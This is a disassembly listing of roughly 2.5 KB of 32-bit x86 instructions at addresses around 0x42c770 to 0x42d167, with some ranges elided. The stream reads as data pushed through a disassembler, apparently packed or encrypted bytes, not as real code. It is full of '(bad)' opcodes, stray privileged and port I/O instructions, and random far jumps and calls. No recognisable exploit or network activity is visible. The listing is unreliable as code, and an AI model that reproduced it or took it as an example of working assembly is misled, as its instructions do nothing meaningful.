  42c770:	bound  edi,QWORD PTR [edi+0x6df7a837]
  42c776:	stos   BYTE PTR es:[edi],al
  42c777:	mov    ah,0xf1
  42c779:	mov    al,0x4
  42c77b:	dec    ecx
  42c77c:	fstp   TBYTE PTR [ebp-0x31242a84]
  42c782:	test   BYTE PTR [ecx+0x62],0x98
  42c786:	rcr    BYTE PTR [edx+0x651c3163],1
  42c78c:	aad    0x73
  42c78e:	jl     0x42c74f
  42c790:	pop    ebp
	...
  42c7f1:	add    BYTE PTR [eax],al
  42c7f3:	add    BYTE PTR [eax],bh
  42c7f5:	mov    DWORD PTR [edx-0x6b],ebp
  42c7f8:	sti    
  42c7f9:	idiv   edi
  42c7fb:	lods   eax,DWORD PTR ds:[esi]
  42c7fc:	pop    ebp
  42c7fd:	sbb    eax,0x2342a40e
  42c802:	int3   
  42c803:	or     eax,0x1dcfa
  42c808:	add    eax,0x24000001
  42c80d:	cs inc esi
  42c80f:	push   ebp
  42c810:	mov    edi,0xa9eedea1
  42c815:	xlat   BYTE PTR ds:[ebx]
  42c816:	mov    ebx,0x9a69f836
  42c81b:	xchg   edx,eax
  42c81c:	push   ebx
  42c81d:	jle    0x42c827
  42c81f:	push   esi
  42c820:	or     BYTE PTR [esp+eax*4+0x4f],bh
  42c824:	cli    
  42c825:	push   eax
  42c826:	in     al,dx
  42c827:	or     DWORD PTR [eax+eax*8+0x5c],0xa081e600
  42c82f:	ret    
  42c830:	and    eax,0x2578ebf0
  42c835:	fmul   st,st(6)
  42c837:	sti    
  42c838:	or     eax,0xca65e7a8
  42c83d:	shr    DWORD PTR [esi+0x32821bfc],cl
  42c843:	data16 out 0x9a,al
  42c846:	add    bh,BYTE PTR [esi]
  42c848:	mov    ah,0x15
  42c84a:	xor    BYTE PTR [esi],dh
  42c84c:	mov    WORD PTR [edx-0x188e4b7c],fs
  42c852:	push   ebx
  42c853:	out    0xca,eax
  42c855:	lds    ebx,FWORD PTR [ebx]
  42c857:	mov    edx,0x97addcb8
  42c85c:	scas   eax,DWORD PTR es:[edi]
  42c85d:	add    ch,ch
  42c85f:	mov    ch,0xd2
  42c861:	add    BYTE PTR [ecx+0x39],ch
  42c864:	loop   0x42c7f5
  42c866:	scas   eax,DWORD PTR es:[edi]
  42c867:	or     edx,DWORD PTR [esi+0x212e7da8]
  42c86d:	push   ebx
  42c86e:	xor    al,0x49
  42c870:	ins    BYTE PTR es:[edi],dx
  42c871:	or     DWORD PTR [ebx-0x50f8041d],ebx
  42c877:	sub    DWORD PTR [esi+0x4a],esp
  42c87a:	mov    dl,0x90
  42c87c:	les    esi,FWORD PTR [esi]
  42c87e:	test   al,0xe0
  42c880:	int    0x5e
  42c882:	mov    ch,bl
  42c884:	(bad)  [ecx+0x2eec326c]
  42c88a:	pop    ss
  42c88b:	mov    dh,0x3d
  42c88d:	sbb    eax,0x2e8d3035
  42c892:	mov    bh,0xde
  42c894:	adc    cl,bl
  42c896:	fadd   st(2),st
  42c898:	cli    
  42c899:	test   al,0xc6
  42c89b:	push   es
  42c89c:	jns    0x42c910
  42c89e:	inc    ecx
  42c89f:	push   ds
  42c8a0:	pop    ebp
  42c8a1:	sbb    al,0xc8
  42c8a3:	or     bl,BYTE PTR [edx]
  42c8a5:	inc    esi
  42c8a6:	and    esp,ecx
  42c8a8:	mov    esp,DWORD PTR [ecx+esi*1-0x4e272ea1]
  42c8af:	mov    edi,0xf00b6264
  42c8b4:	hlt    
  42c8b5:	int3   
  42c8b6:	mov    ds:0xaf19d382,al
  42c8bb:	xchg   esi,eax
  42c8bc:	cld    
  42c8bd:	dec    eax
  42c8be:	sub    dh,BYTE PTR [eax]
  42c8c0:	jne    0x42c8f8
  42c8c2:	or     esi,DWORD PTR [edi+0x50]
  42c8c5:	jg     0x42c889
  42c8c7:	or     DWORD PTR [eax+0x4a],esp
  42c8ca:	(bad)  
  42c8cb:	xchg   edi,eax
  42c8cc:	mov    al,ds:0xda7876c4
  42c8d1:	pop    edx
  42c8d2:	ror    BYTE PTR [edx+edi*2-0x3c47ff2f],0x8e
  42c8da:	fs (bad) 
  42c8dc:	and    al,al
  42c8de:	xchg   ebx,eax
  42c8df:	jl     0x42c936
  42c8e1:	mov    esi,0x14343c8e
  42c8e6:	pusha  
  42c8e7:	push   ebp
  42c8e8:	test   eax,0x6c997fad
  42c8ed:	fnstenv [edi+eax*1+0x4c]
  42c8f1:	cmc    
  42c8f2:	sahf   
  42c8f3:	jb     0x42c946
  42c8f5:	in     al,dx
  42c8f6:	fcmovne st,st(6)
  42c8f8:	inc    esp
  42c8f9:	dec    esp
  42c8fa:	idiv   DWORD PTR [eax-0x27]
  42c8fd:	and    al,0x86
  42c8ff:	inc    ebx
  42c900:	das    
  42c901:	(bad)  
  42c903:	fcomi  st,st(0)
  42c905:	xlat   BYTE PTR ds:[ebx]
  42c906:	das    
  42c907:	pop    esi
  42c908:	add    dl,BYTE PTR [edi]
  42c90a:	dec    edi
  42c90b:	lock lahf 
  42c90d:	add    dh,BYTE PTR [edi]
  42c90f:	ds nop
	...
  42c971:	add    BYTE PTR [eax],al
  42c973:	add    BYTE PTR [eax],dl
  42c975:	sbb    ecx,ecx
  42c977:	jmp    0xfb73c547
  42c97c:	(bad)  
  42c97d:	scas   eax,DWORD PTR es:[edi]
  42c97e:	inc    edi
  42c97f:	call   0x5dd75d38
  42c984:	(bad)  
  42c985:	fld    QWORD PTR [ecx]
  42c987:	add    BYTE PTR ds:0xce000001,al
  42c98d:	pop    esi
  42c98e:	xor    ch,BYTE PTR [ebp+0x72]
  42c991:	mov    ebp,0x64939999
  42c996:	pop    esi
  42c997:	lahf   
  42c998:	push   DWORD PTR [edx]
  42c99a:	or     cl,0xfe
  42c99d:	mov    edx,0xea96bef7
  42c9a2:	xor    eax,0xeaceb431
  42c9a7:	pusha  
  42c9a8:	loopne 0x42c969
  42c9aa:	add    al,0xe2
  42c9ac:	ffreep st(4)
  42c9ae:	and    al,0xcd
  42c9b0:	fsubr  DWORD PTR [edx-0x3e33016]
  42c9b6:	in     al,0xb9
  42c9b8:	jbe    0x42c9b0
  42c9ba:	retf   0xcd3f
  42c9bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c9be:	test   eax,0x6cb3831c
  42c9c3:	mov    bl,0xff
  42c9c5:	fdiv   QWORD PTR [ecx-0x6379a842]
  42c9cb:	push   esp
  42c9cc:	cmp    eax,0x3380beff
  42c9d1:	adc    BYTE PTR [edi],al
  42c9d3:	and    DWORD PTR [edx+0x2c8991d0],esi
  42c9d9:	and    ebp,DWORD PTR [ecx+0x164882eb]
  42c9df:	sahf   
  42c9e0:	dec    eax
  42c9e1:	repz pop ecx
  42c9e3:	xchg   ebx,eax
  42c9e4:	jl     0x42ca59
  42c9e6:	adc    edi,DWORD PTR [esp+ebp*2+0x3]
  42c9ea:	jmp    0x42c98d
  42c9ec:	mov    esi,0x58d7b2c3
  42c9f1:	and    al,0x27
  42c9f3:	lods   eax,DWORD PTR ds:[esi]
  42c9f4:	arpl   WORD PTR ds:0x2fe38c3e,dx
  42c9fa:	xor    eax,ecx
  42c9fc:	stos   DWORD PTR es:[edi],eax
  42c9fd:	sbb    bh,BYTE PTR [eax]
  42c9ff:	push   eax
  42ca00:	xchg   ebp,eax
  42ca01:	pop    edi
  42ca02:	dec    ecx
  42ca03:	aas    
  42ca04:	aad    0x74
  42ca06:	adc    ebx,ebx
  42ca08:	xor    BYTE PTR ds:0x5bb52252,dl
  42ca0e:	lea    ecx,[edi-0x28]
  42ca11:	fist   DWORD PTR [ebx+0x5722ae3a]
  42ca17:	pop    eax
  42ca18:	fwait
  42ca19:	rcr    dh,0x0
  42ca1c:	ins    BYTE PTR es:[edi],dx
  42ca1d:	sbb    al,0xb7
  42ca1f:	daa    
  42ca20:	call   0x2574:0xfd1d876f
  42ca27:	out    0xff,eax
  42ca29:	cs jno 0x42ca90
  42ca2c:	dec    esp
  42ca2d:	in     al,dx
  42ca2e:	and    ax,bp
  42ca31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ca32:	inc    edx
  42ca33:	pop    edx
  42ca34:	mov    dl,0x9c
  42ca36:	popa   
  42ca37:	js     0x42ca3c
  42ca39:	sahf   
  42ca3a:	aam    0x6d
  42ca3c:	ficomp DWORD PTR [esi+0x22ed7d2e]
  42ca42:	icebp  
  42ca43:	mov    al,ds:0x6f33731e
  42ca48:	or     eax,0xa3fb42e3
  42ca4d:	aam    0x94
  42ca4f:	mov    esi,0xbcc641ab
  42ca54:	mov    edi,0xe63ae596
  42ca59:	mov    ch,0xad
  42ca5b:	les    ecx,FWORD PTR [eax-0xda37938]
  42ca61:	adc    DWORD PTR [ebx],edi
  42ca63:	add    ah,BYTE PTR [esp+esi*8]
  42ca66:	leave  
  42ca67:	icebp  
  42ca68:	shl    DWORD PTR [edi+0x44],0xfe
  42ca6c:	imul   edi,DWORD PTR [ebx-0x41],0xffffff8c
  42ca70:	mov    esp,0xee85f1e1
  42ca75:	loope  0x42ca43
  42ca77:	fdivr  QWORD PTR [eax+0x1c]
  42ca7a:	popa   
  42ca7b:	inc    eax
  42ca7c:	and    cl,al
  42ca7e:	aaa    
  42ca7f:	out    dx,eax
  42ca80:	xchg   edi,eax
  42ca81:	imul   ebp,DWORD PTR [eax+0x13c72922],0xd3efad6e
  42ca8b:	aaa    
  42ca8c:	cld    
  42ca8d:	add    eax,0xdf55a2
	...
  42caf2:	add    BYTE PTR [eax],al
  42caf4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42caf5:	fimul  DWORD PTR [eax-0x10ac02bf]
  42cafb:	(bad)  
  42cafc:	fadd   QWORD PTR [ebp+0x7b6f6ec0]
  42cb02:	lahf   
  42cb03:	call   0x105:0x1df04
  42cb0a:	add    BYTE PTR [eax],al
  42cb0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cb0d:	fs cmc 
  42cb0f:	fld    QWORD PTR [eax]
  42cb11:	xchg   esi,eax
  42cb12:	push   ecx
  42cb13:	sbb    al,bl
  42cb15:	sub    ch,BYTE PTR [edx+0x24dab8d4]
  42cb1b:	push   ebx
  42cb1c:	pop    ds
  42cb1d:	in     eax,0x9f
  42cb1f:	gs into 
  42cb21:	jbe    0x42cad2
  42cb23:	mov    esi,0x4574ec71
  42cb28:	das    
  42cb29:	call   0x23ae:0xdf150d0
  42cb30:	adc    BYTE PTR [ecx-0xc],0x76
  42cb34:	pop    eax
  42cb35:	sbb    BYTE PTR [edi+0xb404cfb],bl
  42cb3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cb3c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cb3d:	mov    dh,0xe9
  42cb3f:	ds ds loop 0x42cbae
  42cb43:	fiadd  WORD PTR [esi+0x5f0e4ffd]
  42cb49:	mov    al,0xc8
  42cb4b:	loopne 0x42cae3
  42cb4d:	out    dx,al
  42cb4e:	leave  
  42cb4f:	jmp    0x4f18:0xbd3e9b8c
  42cb56:	ret    0x9045
  42cb59:	sbb    BYTE PTR [esi-0xedc601b],dh
  42cb5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cb60:	aad    0xa2
  42cb62:	or     al,0x81
  42cb64:	mov    ch,0xd5
  42cb66:	mov    ebp,0x49004406
  42cb6b:	dec    ecx
  42cb6c:	pop    eax
  42cb6d:	(bad)  
  42cb6e:	out    0x7c,eax
  42cb70:	pop    eax
  42cb71:	adc    esi,DWORD PTR ss:[ebp+0x5a]
  42cb75:	adc    ebx,DWORD PTR [ebx+0x248b16]
  42cb7b:	stos   BYTE PTR es:[edi],al
  42cb7c:	lahf   
  42cb7d:	mov    ds:0xfbde37b7,al
  42cb82:	(bad)  
  42cb84:	jb     0x42cbef
  42cb86:	add    BYTE PTR [edx+edx*2],al
  42cb89:	icebp  
  42cb8a:	stos   DWORD PTR es:[edi],eax
  42cb8b:	inc    ebp
  42cb8c:	ret    0xd2df
  42cb8f:	cmp    eax,0xeb6657c6
  42cb94:	fwait
  42cb95:	clc    
  42cb96:	mov    edi,0x1a206005
  42cb9b:	test   eax,0x200c7cb7
  42cba0:	in     eax,dx
  42cba1:	imul   edi,DWORD PTR [ebx],0xffffffec
  42cba4:	in     al,0x67
  42cba6:	and    DWORD PTR [ebp+eax*8-0x3634b5b3],esi
  42cbad:	push   esi
  42cbae:	or     dh,dl
  42cbb0:	jp     0x42cbbb
  42cbb2:	pop    es
  42cbb3:	aam    0x29
  42cbb5:	sti    
  42cbb6:	inc    ecx
  42cbb7:	and    al,0xaf
  42cbb9:	fs xor al,0xef
  42cbbc:	enter  0x7968,0xe7
  42cbc0:	cld    
  42cbc1:	xor    esi,DWORD PTR [edi+0x6a]
  42cbc4:	mov    edi,0xb35ff6d
  42cbc9:	lods   al,BYTE PTR ds:[esi]
  42cbca:	mov    eax,ds:0x3dab0b31
  42cbcf:	adc    al,0x49
  42cbd1:	ja     0x42cc18
  42cbd3:	jbe    0x42cbbb
  42cbd5:	rol    BYTE PTR [ebx*2+0x5ab9127b],1
  42cbdc:	test   al,0x29
  42cbde:	enter  0x3542,0x66
  42cbe2:	jp     0x42cba0
  42cbe4:	push   0xffffffbd
  42cbe6:	and    dl,BYTE PTR [ecx]
  42cbe8:	not    DWORD PTR [edi-0x37]
  42cbeb:	and    BYTE PTR [edx-0xf],dh
  42cbee:	inc    edx
  42cbef:	xor    al,BYTE PTR [esi-0x13899daf]
  42cbf5:	mov    eax,0x912a22dc
  42cbfa:	push   esi
  42cbfb:	repz scas eax,DWORD PTR es:[edi]
  42cbfd:	jns    0x42cbd2
  42cbff:	push   edx
  42cc00:	loope  0x42cc7c
  42cc02:	pop    ds
  42cc03:	inc    edi
  42cc04:	xchg   DWORD PTR [esp+ebx*2-0xce967fa],ebp
  42cc0b:	outs   dx,BYTE PTR ds:[esi]
  42cc0c:	jae    0x42cbad
  42cc0e:	and    cl,cl
  42cc10:	push   cs
	...
  42cc71:	add    BYTE PTR [eax],al
  42cc73:	add    BYTE PTR [edi+0x2],bh
  42cc76:	mov    esp,DWORD PTR [edi+edi*8-0x13]
  42cc7a:	call   FWORD PTR [ebx]
  42cc7c:	fisttp WORD PTR [ebp+0x1]
  42cc7f:	or     eax,0x856cb6eb
  42cc84:	or     eax,esp
  42cc86:	add    DWORD PTR [eax],eax
  42cc88:	add    eax,0xa3000001
  42cc8d:	fstp   QWORD PTR [ebx]
  42cc8f:	lds    esi,FWORD PTR [ecx-0x4d]
  42cc92:	sub    BYTE PTR [ecx-0x39],al
  42cc95:	sub    eax,0xa659c47f
  42cc9a:	pushf  
  42cc9b:	jp     0x42cc9e
  42cc9d:	push   esp
  42cc9e:	or     BYTE PTR [ebp-0x40d5981],0x43
  42cca5:	in     al,0xeb
  42cca7:	pop    esi
  42cca8:	jno    0x42ccad
  42ccaa:	xor    ecx,DWORD PTR [eax+0x7f7f21f0]
  42ccb0:	lds    ecx,FWORD PTR [edi+ebx*2-0x7c]
  42ccb4:	sub    al,0x64
  42ccb6:	sbb    esp,DWORD PTR [esi]
  42ccb8:	scas   al,BYTE PTR es:[edi]
  42ccb9:	xor    BYTE PTR [eax-0x62],0xb5
  42ccbd:	mov    ds:0xe7787dfe,eax
  42ccc2:	jmp    0x42cd27
  42ccc4:	popf   
  42ccc5:	jne    0x42cc95
  42ccc7:	xor    eax,0x1c635b8d
  42cccc:	pcmpgtd mm5,QWORD PTR [esi-0x40]
  42ccd0:	adc    eax,0x715e89cd
  42ccd5:	int    0xea
  42ccd7:	les    ecx,FWORD PTR [edi+0x30]
  42ccda:	pop    edx
  42ccdb:	push   es
  42ccdc:	(bad)  
  42ccdd:	mov    cl,0x18
  42ccdf:	fsub   QWORD PTR [ecx+0x4bd69e5]
  42cce5:	les    esp,FWORD PTR [edi+0x62562b12]
  42cceb:	clc    
  42ccec:	mov    dh,0xfe
  42ccee:	shr    DWORD PTR [ecx],cl
  42ccf0:	sub    ch,cl
  42ccf2:	outs   dx,DWORD PTR ds:[esi]
  42ccf3:	mov    BYTE PTR [edx-0x7c],bh
  42ccf6:	outs   dx,DWORD PTR ds:[esi]
  42ccf7:	pop    ebp
  42ccf8:	jae    0x42cd79
  42ccfa:	mov    ds:0x8093ed46,eax
  42ccff:	in     al,dx
  42cd00:	push   ebp
  42cd01:	ror    BYTE PTR [edi+0x5f],0x2b
  42cd05:	shl    al,1
  42cd07:	daa    
  42cd08:	lahf   
  42cd09:	or     ecx,DWORD PTR [edi]
  42cd0b:	inc    esp
  42cd0c:	sbb    eax,0x34d2c677
  42cd11:	jmp    0x42ccb8
  42cd13:	add    eax,0xffffffa0
  42cd16:	retfw  
  42cd18:	mov    eax,0x26e3c073
  42cd1d:	jmp    0x6d41e20a
  42cd22:	fwait
  42cd23:	addps  xmm5,XMMWORD PTR [ecx+0x3d7bccdd]
  42cd2a:	out    0x33,al
  42cd2c:	mov    ebp,0x8095df27
  42cd31:	pop    eax
  42cd32:	pop    esi
  42cd33:	retf   
  42cd34:	or     al,0x17
  42cd36:	pop    es
  42cd37:	pusha  
  42cd38:	jb     0x42cd06
  42cd3a:	pop    esi
  42cd3b:	cmp    al,0x9c
  42cd3d:	icebp  
  42cd3e:	fwait
  42cd3f:	xor    BYTE PTR [ebx-0x29c690f8],ah
  42cd45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42cd46:	push   ebx
  42cd47:	add    esp,DWORD PTR [esi]
  42cd49:	aaa    
  42cd4a:	adc    DWORD PTR [ebx+esi*4],esi
  42cd4d:	mov    dh,0x14
  42cd4f:	pop    edi
  42cd50:	sub    esi,esi
  42cd52:	add    eax,DWORD PTR [eax-0x1e37a8a8]
  42cd58:	loop   0x42cdd4
  42cd5a:	jo     0x42cd66
  42cd5c:	push   eax
  42cd5d:	add    al,0x8b
  42cd5f:	cmp    eax,0x68d76c01
  42cd64:	jno    0x42cd5a
  42cd66:	ror    edx,1
  42cd68:	jecxz  0x42cdb9
  42cd6a:	bound  edi,QWORD PTR [edi+0x1662b713]
  42cd70:	mov    eax,ds:0xd7131ee0
  42cd75:	xchg   esp,eax
  42cd76:	mov    al,ds:0x63cae700
  42cd7b:	in     eax,0x2d
  42cd7d:	mov    dl,0xfb
  42cd7f:	jnp    0x42cd89
  42cd81:	out    0x64,eax
  42cd83:	outs   dx,BYTE PTR ds:[esi]
  42cd84:	arpl   dx,dx
  42cd86:	gs popf 
  42cd88:	push   edx
  42cd89:	repnz pop edi
  42cd8b:	pushf  
  42cd8c:	mov    cl,0x3a
  42cd8e:	outs   dx,BYTE PTR ds:[esi]
  42cd8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42cd90:	push   esi
	...
  42cdf1:	add    BYTE PTR [eax],al
  42cdf3:	add    BYTE PTR [ecx],bl
  42cdf5:	mov    eax,ds:0xdffe87fe
  42cdfa:	jns    0x42cdbb
  42cdfc:	xchg   BYTE PTR [esi],dh
  42cdfe:	xchg   esi,eax
  42cdff:	mov    ch,0x58
  42ce01:	sbb    al,0xd7
  42ce03:	scas   eax,DWORD PTR es:[edi]
  42ce04:	push   cs
  42ce05:	loope  0x42ce08
  42ce07:	add    BYTE PTR ds:0x7b000001,al
  42ce0d:	(bad)  
  42ce0e:	cdq    
  42ce0f:	mov    WORD PTR [ebp+ecx*1-0x27a10d28],es
  42ce16:	out    0x2b,al
  42ce18:	push   ecx
  42ce19:	mov    ch,0xd2
  42ce1b:	ret    0xb3ea
  42ce1e:	mov    bh,0xdf
  42ce20:	sar    DWORD PTR [edi],cl
  42ce22:	int3   
  42ce23:	idiv   DWORD PTR [ebp+0x61e786bb]
  42ce29:	jle    0x42ce75
  42ce2b:	(bad)  
  42ce2c:	in     eax,0x70
  42ce2e:	xchg   esp,eax
  42ce2f:	ss mov ch,0xb
  42ce32:	dec    ebx
  42ce33:	repnz bound edx,QWORD PTR [ebp-0x12]
  42ce37:	stos   DWORD PTR es:[edi],eax
  42ce38:	jg     0x42ce46
  42ce3a:	int3   
  42ce3b:	xor    dh,cl
  42ce3d:	loope  0x42cdf6
  42ce3f:	and    eax,0x2861f6ba
  42ce44:	xor    BYTE PTR [eax],al
  42ce46:	jmp    0xac54:0x2cf52bc2
  42ce4d:	daa    
  42ce4e:	and    ecx,DWORD PTR [eax]
  42ce50:	(bad)  
  42ce51:	in     al,0xda
  42ce53:	int    0xf2
  42ce55:	aad    0x51
  42ce57:	fwait
  42ce58:	call   0xfcaf:0x524a8d4c
  42ce5f:	loop   0x42ce7f
  42ce61:	cdq    
  42ce62:	push   esp
  42ce63:	or     ebp,ecx
  42ce65:	pop    edx
  42ce66:	out    0x88,eax
  42ce68:	jge    0x42ce9b
  42ce6a:	mov    dh,0xf7
  42ce6c:	iret   
  42ce6d:	jne    0x42ce7a
  42ce6f:	leave  
  42ce70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ce71:	xchg   edi,eax
  42ce72:	clc    
  42ce73:	aad    0x95
  42ce75:	mov    ebp,0x67806e40
  42ce7a:	inc    edi
  42ce7b:	add    BYTE PTR [ecx+eiz*4-0x4f],cl
  42ce7f:	les    ebp,FWORD PTR [ebp+eiz*8+0x16]
  42ce83:	addr16 loop 0x42ced5
  42ce86:	enter  0x6d6c,0x65
  42ce8a:	fstp   st(4)
  42ce8c:	inc    edi
  42ce8d:	or     DWORD PTR [esi],edx
  42ce8f:	xor    bh,BYTE PTR [ecx+esi*4+0x3f9d733]
  42ce96:	ret    0xb065
  42ce99:	jne    0x42cf0a
  42ce9b:	xchg   edi,eax
  42ce9c:	out    dx,eax
  42ce9d:	imul   esi,DWORD PTR [ecx+0x3f],0xa334b6aa
  42cea4:	mov    ch,0x76
  42cea6:	jecxz  0x42cf0f
  42cea8:	cld    
  42cea9:	retf   0x7532
  42ceac:	hlt    
  42cead:	jmp    0x8e6f:0xf20006bf
  42ceb4:	pcmpeqw mm7,mm7
  42ceb7:	jne    0x42ce5e
  42ceb9:	repz mov edi,0x95f4ccfb
  42cebf:	mov    ebx,0xb02bb50f
  42cec4:	outs   dx,DWORD PTR ds:[esi]
  42cec5:	pop    esi
  42cec6:	jge    0x42ce65
  42cec8:	push   edx
  42cec9:	dec    ebx
  42ceca:	inc    ecx
  42cecb:	and    ch,BYTE PTR [ecx+0x3c]
  42cece:	ror    esi,1
  42ced0:	sub    DWORD PTR ss:[edx-0x1d],ebp
  42ced4:	adc    cl,dl
  42ced6:	gs scas al,BYTE PTR es:[edi]
  42ced8:	jecxz  0x42ceb2
  42ceda:	call   0x46694a35
  42cedf:	(bad)  
  42cee0:	leave  
  42cee1:	sub    eax,0x8492702e
  42cee6:	pop    ds
  42cee7:	cmp    DWORD PTR [edx],0x1b
  42ceea:	xchg   edx,eax
  42ceeb:	ror    BYTE PTR [eax],cl
  42ceed:	xchg   esp,eax
  42ceee:	sahf   
  42ceef:	pop    esp
  42cef0:	pop    edi
  42cef1:	aam    0x79
  42cef3:	int3   
  42cef4:	out    dx,eax
  42cef5:	adc    eax,0xb9d7ee1c
  42cefa:	push   edi
  42cefb:	pop    ss
  42cefc:	pop    edx
  42cefd:	xchg   ebp,eax
  42cefe:	inc    eax
  42ceff:	mov    ds:0xeb19a8df,al
  42cf04:	into   
  42cf05:	pop    edi
  42cf06:	out    dx,eax
  42cf07:	mov    dh,0x39
  42cf09:	mov    ebp,0x90bcb2be
  42cf0e:	std    
  42cf0f:	inc    edi
  42cf10:	mov    BYTE PTR [eax],al
	...
  42cf72:	add    BYTE PTR [eax],al
  42cf74:	jae    0x42cfb3
  42cf76:	fadd   st,st(1)
  42cf78:	fsubrp st(5),st
  42cf7a:	jnp    0x42cf3b
  42cf7c:	or     al,BYTE PTR [esi]
  42cf7e:	cld    
  42cf7f:	les    esi,FWORD PTR [edx]
  42cf81:	cwde   
  42cf82:	iret   
  42cf83:	jmp    0x105:0x1e213
  42cf8a:	add    BYTE PTR [eax],al
  42cf8c:	lock aam 0x98
  42cf8f:	jecxz  0x42cfcf
  42cf91:	push   esp
  42cf92:	mov    ebx,cr0
  42cf95:	xor    esp,DWORD PTR [ebp-0x48]
  42cf98:	sahf   
  42cf99:	icebp  
  42cf9a:	retf   0x6a2f
  42cf9d:	add    ah,0xed
  42cfa0:	cs lahf 
  42cfa2:	or     DWORD PTR [edi],esp
  42cfa4:	mov    dh,0x45
  42cfa6:	clc    
  42cfa7:	push   ss
  42cfa8:	mov    DWORD PTR [esi-0x42e659cf],edx
  42cfae:	jo     0x42cf48
  42cfb0:	sti    
  42cfb1:	je     0x42d012
  42cfb3:	enter  0xe74b,0x3d
  42cfb7:	(bad)
  42cfbb:	out    dx,eax
  42cfbc:	sahf   
  42cfbd:	dec    esi
  42cfbe:	pop    ebx
  42cfbf:	cmp    ebp,DWORD PTR [ecx+0x2e57db48]
  42cfc5:	(bad)  [eax]
  42cfc7:	ins    DWORD PTR es:[edi],dx
  42cfc8:	dec    edx
  42cfc9:	mov    eax,ds:0xc8eac0d0
  42cfce:	mov    eax,0x9d5bd6fb
  42cfd3:	std    
  42cfd4:	lock pop DWORD PTR [ebp-0x78]
  42cfd8:	xor    eax,0x13631298
  42cfdd:	dec    ebp
  42cfde:	push   ecx
  42cfdf:	fcmovnbe st,st(0)
  42cfe1:	mov    ebx,0x4ab37ef9
  42cfe6:	repnz fs inc edx
  42cfe9:	fdivp  st(6),st
  42cfeb:	std    
  42cfec:	gs popa 
  42cfee:	dec    DWORD PTR [ebx+ebp*8+0x6a2c3e1f]
  42cff5:	or     eax,0xc4036e99
  42cffa:	sub    al,BYTE PTR [eax+0x1a8300f9]
  42d000:	inc    esp
  42d001:	mov    eax,0x1ade4b1c
  42d006:	mov    ebx,0x7d794b02
  42d00b:	or     esp,0xffffffa6
  42d00e:	fs (bad) 
  42d010:	cmp    BYTE PTR [ebx+edx*2+0x4703c5e4],dl
  42d017:	add    eax,0x12ab8f81
  42d01c:	add    DWORD PTR [eax-0x77fd10ab],0xffffffb2
  42d023:	push   ebp
  42d024:	stos   DWORD PTR es:[edi],eax
  42d025:	mov    ebx,0x1468bc8b
  42d02a:	inc    edx
  42d02b:	sbb    DWORD PTR [ecx-0x28],ebp
  42d02e:	jmp    0x42cfc9
  42d030:	(bad)  
  42d031:	daa    
  42d032:	fwait
  42d033:	leave  
  42d034:	cmc    
  42d035:	jge    0x42d00b
  42d037:	jle    0x42d025
  42d039:	cmp    bh,BYTE PTR [edi-0x15]
  42d03c:	nop
  42d03d:	jmp    0x42cfe8
  42d03f:	ror    al,1
  42d041:	mov    esi,0x674a1b18
  42d046:	jg     0x42d071
  42d048:	xor    edx,edx
  42d04a:	shr    DWORD PTR [ecx-0x174c598f],cl
  42d050:	rol    BYTE PTR [eax+eiz*1],cl
  42d053:	daa    
  42d054:	push   ds
  42d055:	dec    eax
  42d056:	inc    eax
  42d057:	aas    
  42d058:	inc    edx
  42d059:	int    0xc
  42d05b:	nop
  42d05c:	jge    0x42d01e
  42d05e:	stos   DWORD PTR es:[edi],eax
  42d05f:	jae    0x42d01c
  42d061:	adc    esp,DWORD PTR [edi]
  42d063:	dec    eax
  42d064:	xchg   edx,eax
  42d065:	out    dx,al
  42d066:	xor    esi,0xc0f4dabc
  42d06c:	loop   0x42d02e
  42d06e:	(bad)  
  42d06f:	out    dx,al
  42d070:	out    0x33,al
  42d072:	repnz shr BYTE PTR [eax],0xf9
  42d076:	push   esi
  42d077:	cmp    cl,BYTE PTR [ecx]
  42d079:	mov    bh,0xe8
  42d07b:	jp     0x42d06b
  42d07d:	push   0xfffffff5
  42d07f:	out    dx,eax
  42d080:	inc    esi
  42d081:	sub    edi,DWORD PTR [edi-0x50767758]
  42d087:	imul   ebp,DWORD PTR [esi-0x61d56e28],0x67
  42d08e:	loop   0x42d0ee
  42d090:	mov    edi,0x0
	...
  42d0f1:	add    BYTE PTR [eax],al
  42d0f3:	add    BYTE PTR [eax+0x3a],dl
  42d0f6:	(bad)  
  42d0f7:	sub    al,0xee
  42d0f9:	cld    
  42d0fa:	cli    
  42d0fb:	jle    0x42d090
  42d0fd:	dec    esp
  42d0fe:	nop
  42d0ff:	xor    al,dh
  42d101:	sbb    DWORD PTR [edi+0x74],eax
  42d104:	sbb    bl,ah
  42d106:	add    DWORD PTR [eax],eax
  42d108:	add    eax,0xbf000001
  42d10d:	dec    ecx
  42d10e:	adc    DWORD PTR [esi-0x78a503b],edi
  42d114:	inc    eax
  42d115:	sub    bh,ah
  42d117:	push   eax
  42d118:	dec    edi
  42d119:	inc    ebp
  42d11a:	mov    bl,0xeb
  42d11c:	loopne 0x42d16d
  42d11e:	pop    es
  42d11f:	push   esi
  42d120:	rcl    BYTE PTR [edx+0x1b53fe99],1
  42d126:	dec    edi
  42d127:	pop    ebx
  42d128:	jae    0x42d0fa
  42d12a:	stos   BYTE PTR es:[edi],al
  42d12b:	aaa    
  42d12c:	adc    BYTE PTR es:[esp+ecx*8-0x31a16383],bl
  42d134:	jle    0x42d14e
  42d136:	push   0xd2d69b99
  42d13b:	fidiv  WORD PTR [eax-0x66]
  42d13e:	int3   
  42d13f:	rcr    BYTE PTR [eax],0xba
  42d142:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d143:	iret   
  42d144:	addr16 das 
  42d146:	pop    es
  42d147:	mov    al,ds:0x2acb2409
  42d14c:	push   ebx
  42d14d:	or     eax,0x498e3890
  42d152:	adc    dl,BYTE PTR ds:0xa36c6b5b
  42d158:	xor    BYTE PTR [ecx-0x26],0x20
  42d15c:	call   0x7816:0x67f92c85
  42d163:	push   cs
  42d164:	outs   dx,DWORD PTR ds:[esi]
  42d165:	xchg   edi,eax
  42d166:	inc    esp
  42d167:	push   es
